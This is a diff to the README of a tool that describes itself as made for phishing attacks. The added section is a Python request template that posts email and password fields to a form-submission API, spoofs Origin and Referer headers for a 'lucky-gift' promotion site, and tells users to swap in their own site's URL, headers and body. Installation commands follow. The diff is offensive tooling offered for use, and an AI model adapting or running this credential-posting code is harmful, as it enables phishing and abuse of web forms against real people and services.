@@ -19,6 +19,41 @@ Dedsec_Zloy_moshennik is a Linux-based tool designed for phishing attacks. This 
 <img src="https://i.imgur.com/iGVKiC0.png", width="500", height="500">
 </p>
 
+### You can replace the code below for your website's url, header and body
+```python
+            url = "https://api.ldpform.com/sendform"
+
+            headers = {
+                "Host": "api.ldpform.com",
+                "Origin": "https://www.lucky-gift-hunyo.online",
+                "Referer": "https://www.lucky-gift-hunyo.online/",
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+            }
+
+            body = {
+                "form_config_id": random_id,
+                "ladi_form_id": "FORM24",
+                "ladipage_id": random_id,
+                "tracking_form": [
+                    {"name": "url_page", "value": "https://www.lucky-gift-hunyo.online/"},
+                    {"name": "utm_source", "value": ""},
+                    {"name": "utm_medium", "value": ""},
+                    {"name": "utm_campaign", "value": ""},
+                    {"name": "utm_term", "value": ""},
+                    {"name": "utm_content", "value": ""},
+                    {"name": "variant_url", "value": ""},
+                    {"name": "variant_content", "value": ""}
+                ],
+                "form_data": [
+                    {"name": "form_item12", "value": f"{email}"},
+                    {"name": "password", "value": f"{password}"}
+                ],
+                "data_key": None,
+                "status_send": 2,
+                "total_revenue": 0,
+                "time_zone": 7
+            }
+```
 ## INSTALLATION 
     * git clone https://github.com/0xbitx/DEDSEC_Zloy_moshennik.git
     * cd DEDSEC_Zloy_moshennik
